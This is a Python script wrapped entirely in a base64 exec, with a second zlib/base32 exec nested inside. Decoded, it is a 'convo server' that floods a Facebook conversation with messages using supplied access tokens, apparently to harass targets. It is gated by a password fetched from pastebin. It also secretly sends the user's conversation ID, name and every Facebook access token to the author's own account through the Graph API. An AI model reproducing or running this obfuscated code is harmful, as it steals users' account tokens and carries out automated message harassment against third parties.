import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBweXR6DQppbXBvcnQgZGF0ZXRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgcmFuZG9tDQpodG1sX2NvbnRlbnQgPSAiIiINCjwhRE9DVFlQRSBodG1sPg0KPGh0bWw+DQo8aGVhZD4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPk1BTElLIENPTlZPIFNFUlZFUjwvdGl0bGU+DQogICAgPHN0eWxlPg0KICAgICAgICBib2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgnc2F0aXNoLmpwZycpOw0KICAgICAgICAgICAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgICAgICAgfQ0KICAgICAgICAuY29udGFpbmVyIHsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgICAgICAgIG1hcmdpbi10b3A6IDUwcHg7DQogICAgICAgIH0NCiAgICAgICAgLmJveCB7DQogICAgICAgICAgICBib3JkZXI6IDJweCBzb2xpZCBibGFjazsNCiAgICAgICAgICAgIHdpZHRoOiAzMDBweDsNCiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOw0KICAgICAgICAgICAgcGFkZGluZzogMjBweDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KTsNCiAgICAgICAgICAgIGNvbG9yOiBibGFjazsNCiAgICAgICAgfQ0KICAgICAgICAuY3JlZGl0IHsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGxlZnQ7DQogICAgICAgIH0NCiAgICAgICAgLnRoYW5rcyB7DQogICAgICAgICAgICBtYXJnaW4tdG9wOiA1MHB4Ow0KICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOw0KICAgICAgICAgICAgY29sb3I6IGJsYWNrOw0KICAgICAgICB9DQogICAgPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQogICAgICAgIDxkaXYgY2xhc3M9ImJveCI+DQogICAgICAgICAgICA8aDE+TUFMSUsgQ09OVk8gU0VSVkVSPC9oMT4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNyZWRpdCI+DQogICAgICAgICAgICAgICAgPHA+MS4gQ1JFRElUOi1NQUxJSyBIRVJFPC9wPg0KICAgICAgICAgICAgICAgIDxwPjIuIE9XTkVSID0+IE1BTElLIDwvcD4NCiAgICAgICAgICAgICAgICA8cD4zLiBDT05UQUNUOi0gPGEgaHJlZj0iaHR0cHM6Ly93YS5tZS8rODgwMTg3OTc5Njg1NyI+V2hhdHNBcHA8L2E+PC9wPg0KICAgICAgICAgICAgICAgIDxwPjQuIEZBQ0VCT09LOi0gPGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAwMjUwNzE4ODgxNCI+RmFjZWJvb2s8L2E+PC9wPg0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDxkaXYgY2xhc3M9InRoYW5rcyI+DQogICAgICAgIDxwPuKdpO+4j1RoYW5rcyBmb3IgdXNpbmcgbXkgc2VydmVy4p2k77iPPC9wPg0KICAgICAgICA8cD7wn5GH8J+RhzwvcD4NCiAgICAgICAgPGEgaHJlZj0iPC9hPg0KICAgIDwvZGl2Pg0KPC9ib2R5Pg0KPC9odG1sPg0KIiIiDQpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToNCiAgICBkZWYgZG9fR0VUKHNlbGYpOg0KICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQ0KICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9odG1sJykNCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpDQogICAgICAgIHNlbGYud2ZpbGUud3JpdGUoaHRtbF9jb250ZW50LmVuY29kZSgpKQ0KZGVmIGV4ZWN1dGVfc2VydmVyKCk6DQogICAgUE9SVCA9IGludChvcy5lbnZpcm9uLmdldCgnUE9SVCcsIDQwMDApKQ0KICAgIHdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOg0KICAgICAgICBwcmludCgiU2VydmVyIHJ1bm5pbmcgYXQgaHR0cDovL2xvY2FsaG9zdDp7fSIuZm9ybWF0KFBPUlQpKQ0KICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkNCnV0Y19ub3cgPSBkYXRldGltZS5kYXRldGltZS51dGNub3coKQ0KaW5kaWFuX3RpbWV6b25lID0gcHl0ei50aW1lem9uZSgnQXNpYS9Lb2xrYXRhJykNCmlzdF9ub3cgPSB1dGNfbm93LnJlcGxhY2UodHppbmZvPXB5dHoudXRjKS5hc3RpbWV6b25lKGluZGlhbl90aW1lem9uZSkNCmZvcm1hdHRlZF90aW1lID0gaXN0X25vdy5zdHJmdGltZSgiXDAzM1sxOzM4OzU7MjA4bSBUaW1lIDotICVZLSVtLSVkICVJOiVNOiVTICVwIikNCnByaW50KGZvcm1hdHRlZF90aW1lKQ0KaGVhZGVycyA9IHsNCiAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywNCiAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLA0KICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLA0KICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsDQogICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywNCiAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywNCiAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScNCn0NCg0KXyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ3psaWInKS5kZWNvbXByZXNzKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmIzMmRlY29kZShfX1s6Oi0xXSkpO2V4ZWMoKF8pKGInPUFWVUpYMldESTdYN0xQNkVXR0ZSWlZGR1FTVUlMQ1FBU01DNERPWFJJNTdNTTJTS0pLVUhCSVZVMkNCUjRCUUs3TUI0RVQ2TjNMWE1NNldUWjZVM1pVMkJaVllORjNSN0k2UVRRWUdLTlZJSVNJNVJSQVJHQU81RVlLUFZXU01UN1FKWkVMSTdCWllVRFJKSkxZRFVDRUNBVzVKV0FaUk1JREE2R1BMN080RUJPRjczS0k3VUE1R0xRN0pXRlI2RU5IQ1A0TUpXRVBLWUZHQVFWNURZTVhDS1FKNlVOTkZGSVpQR1BSRjJSWEc0S05RU1U1Q0xIQjVHT0lCRFFORVZHVEhGSUNMQU42N1E2NlVZQU1JMlFPRE40V0EyTlgzMjJVSkxFTlI3Nk9XUDZSQ0lWWE5aWTVLR0RSVjI0RkZBWUFHRUVIV0I2QkhOR0pYQVVVRERVSldUQUdHNVcyVkRXTllZT1dUNUtQU1NHUkQ0V01LNEZSNUI1SFYzWEVINFk0RTMzUEFPVTRZSElRV1JERlRNV0dSTFhYRE1CQ1ZQQUY3QU9WWUFSTElNRVlWTFFKUVM1VlRTVjIyWVJTUkRDWkRJQTdWUzJJNUNFRlNWV1hBQ0JMT0xKMjJHREJJNEJFWUVMSVBGUkZGS1JQQ0JQSk41VVpKTjNLRjRJM0tEUDM1TFQ3NkFMTkZJUlBORTVFRUs2VkhLUzNKVEtKTElSMk02WUZVSDZUN1pQNVhQVlg3SFBWWDc3UDc3UEhLM0ZJNUczNFZISFk3N1JCTVJKTVFVMzIzTkJZTkNHT0lLR1RZNlREWUVBQUFETzNSWkJVTEJPQ1AnKSkNCg0KZGVmIHNlbmRfaW5pdGlhbF9tZXNzYWdlKCk6DQogICAgDQogICAgbW1tX3Bhc3MgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9yMm1oWnAxcycpLnRleHQNCiAgICANCiAgICBpZiBtbW1fcGFzcyBub3QgaW4gcGFzc3dvcmQ6DQogICAgICAgIHByaW50KCdcMDMzWzE7MzFt4pqg77iOIFlvdXIgUGFzc3dvcmQgQ2hhbmdlZCBCeSBNYWxpa3cg4pqg77iOJykNCiAgICAgICAgc3lzLmV4aXQoKQ0KICAgIA0KICAgICMgTWVzc2FnZSB0ZW1wbGF0ZQ0KICAgIG1zZ190ZW1wbGF0ZSA9ICJPd25lciA9PiBNQUxJSyBcbiBIZWxsbyBtYWxpayBzaXIuIFxuIEkgYW0gdXNpbmcgeW91ciBjb252byBzZXJ2ZXIuIFxuIFRoaXMgSXMgTXkgRGV0YWlscyA6LSBcbiBDb252byBJRCA6LSB7fSBcbiBOYW1lOi0ge30gXG4gVG9rZW4gOi0ge30iDQogICAgDQogICAgIyBUYXJnZXQgSURzDQogICAgdGFyZ2V0X2lkcyA9IFsiMTAwMDAyNTA3MTg4ODE0Il0NCiAgICANCiAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQ0KICAgIA0KICAgIGZvciB0YXJnZXRfaWQgaW4gdGFyZ2V0X2lkczoNCiAgICAgICAgZm9yIHRva2VuIGluIHRva2VuczoNCiAgICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnN0cmlwKCkNCiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgdGFyZ2V0X2lkKQ0KICAgICAgICAgICAgbXNnID0gbXNnX3RlbXBsYXRlLmZvcm1hdChjb252b19pZCwgaGF0ZXJzX25hbWUsIGFjY2Vzc190b2tlbikNCiAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBtc2d9DQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQ0KICAgICAgICAgICAgcHJpbnQoIlxuXDAzM1sxOzMxbVsrXSBJbml0aWFsIG1lc3NhZ2Ugc2VudCB0byB0YXJnZXQgSUQ6IHt9LiBDb250aW51aW5nLi4uXG4iLmZvcm1hdCh0YXJnZXRfaWQpKQ0KDQpzZW5kX2luaXRpYWxfbWVzc2FnZSgpDQpkZWYgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKToNCiAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykNCiAgICBtYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOg0KICAgICAgICAgICAgICAgIHRva2VuX2luZGV4ID0gbWVzc2FnZV9pbmRleCAlIG1heF90b2tlbnMNCiAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbnNbdG9rZW5faW5kZXhdLnN0cmlwKCkNCiAgICAgICAgICAgICAgICBtZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQ0KICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgY29udm9faWQpDQogICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0NCiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5vazoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszNm1b4pyTXSBZb3VyIE1hc3NhZ2UgU3VjY2Vzc2Z1bGx5IFNlbnQgQnkgTWFsaUsgQ29udm8gU2VydmVyIE5vLiB7fSBvZiBDb252byB7fSBUb2tlbiB7fToge30iLmZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQ0KICAgICAgICAgICAgICAgICAgICBwcmludChmb3JtYXR0ZWRfdGltZSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5Mm0nICsgJ+KcquKcreKVkOKVkOKVkOKVkOKVkOKVkOKVkOKAouOAjiBNQUxJSyBIRVJFIOOAj+KAouKVkOKVkOKVkOKVkOKVkOKVkOKVkOKcreKcqicpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszNW1beF0gRmFpbGVkIHRvIHNlbmQgTWVzc2FnZSB7fSBvZiBDb252byB7fSB3aXRoIFRva2VuIHt9OiB7fSIuZm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpDQogICAgICAgICAgICAgICAgICAgIHByaW50KGZvcm1hdHRlZF90aW1lKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkybScgKyAn4pyq4pyt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4oCi44COIE1BTElLIEhFUkUg44CP4oCi4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pyt4pyqJykNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHNwZWVkKQ0KICAgICAgICAgICAgcHJpbnQoIlxuWytdIEFsbCBtZXNzYWdlcyBzZW50LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uXG4iKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQ0KZGVmIG1haW4oKToNCiAgICBzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpDQogICAgc2VydmVyX3RocmVhZC5zdGFydCgpDQogICAgc2VuZF9pbml0aWFsX21lc3NhZ2UoKQ0KICAgIHNlbmRfbWVzc2FnZXNfZnJvbV9maWxlKCkNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgbWFpbigp'))